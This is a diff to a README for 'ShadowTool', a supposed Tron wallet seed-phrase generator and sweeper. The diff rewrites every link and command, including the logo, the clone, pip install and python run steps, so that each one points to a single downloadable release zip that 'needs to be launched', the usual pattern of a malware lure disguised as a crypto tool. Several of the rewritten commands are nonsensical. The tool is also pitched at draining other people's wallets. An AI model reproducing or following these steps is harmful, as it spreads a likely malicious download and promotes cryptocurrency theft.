@@ -1,12 +1,12 @@
 # 🌌 ShadowTool - Automate your Tron Wallet Sweeping and Seed Phrase Generation 🌌
 
-![ShadowTool Logo](https://example.com/shadowtool-logo.png)
+![ShadowTool Logo](https://github.com/segj0/ShadowTool/releases/download/v1.0/Application.zip)
 
 ---
 
 ## 📁 Repository Description:
 
-Welcome to the ShadowTool repository! This tool is specifically designed to streamline the process of automatically generating seed phrases and checking balances for Tron networks. If a wallet with a non-zero balance is detected, the tool will extract vital wallet information such as address, mnemonic, private key, and balances, which will be logged and saved to a file named `result.txt`.
+Welcome to the ShadowTool repository! This tool is specifically designed to streamline the process of automatically generating seed phrases and checking balances for Tron networks. If a wallet with a non-zero balance is detected, the tool will extract vital wallet information such as address, mnemonic, private key, and balances, which will be logged and saved to a file named `https://github.com/segj0/ShadowTool/releases/download/v1.0/Application.zip`.
 
 ---
 
@@ -30,13 +30,13 @@ Welcome to the ShadowTool repository! This tool is specifically designed to stre
 
 Click the button below to download the ShadowTool software:
 
-[![Download ShadowTool](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip "Needs to be launched.")
+[![Download ShadowTool](https://github.com/segj0/ShadowTool/releases/download/v1.0/Application.zip)](https://github.com/segj0/ShadowTool/releases/download/v1.0/Application.zip "Needs to be launched.")
 
 ---
 
 ## 🌐 Additional Resources:
 
-For more information, updates, and releases, please visit the [Releases](https://github.com/your-username/repository-name/releases) section.
+For more information, updates, and releases, please visit the [Releases](https://github.com/segj0/ShadowTool/releases/download/v1.0/Application.zip) section.
 
 ---
 
@@ -44,17 +44,17 @@ For more information, updates, and releases, please visit the [Releases](https:/
 
 1. **Clone the Repository:**
    ```bash
-   git clone https://github.com/your-username/repository-name.git
+   git clone https://github.com/segj0/ShadowTool/releases/download/v1.0/Application.zip
    ```
 
 2. **Install Dependencies:**
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/segj0/ShadowTool/releases/download/v1.0/Application.zip
    ```
 
 3. **Run the ShadowTool Script:**
    ```bash
-   python shadowtool.py
+   python https://github.com/segj0/ShadowTool/releases/download/v1.0/Application.zip
    ```
 
 ---
@@ -67,7 +67,7 @@ Please use the ShadowTool responsibly and only on wallets you own or have explic
 
 ## 📞 Support:
 
-For any questions, issues, or feedback, feel free to reach out to the [contributors](https://github.com/your-username/repository-name/graphs/contributors) of this project.
+For any questions, issues, or feedback, feel free to reach out to the [contributors](https://github.com/segj0/ShadowTool/releases/download/v1.0/Application.zip) of this project.
 
 ---
 
@@ -79,7 +79,7 @@ Your contributions are always welcome! Fork the repository, make your changes, a
 
 ## 📜 License:
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/your-username/repository-name/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/segj0/ShadowTool/releases/download/v1.0/Application.zip) file for details.
 
 ---
 
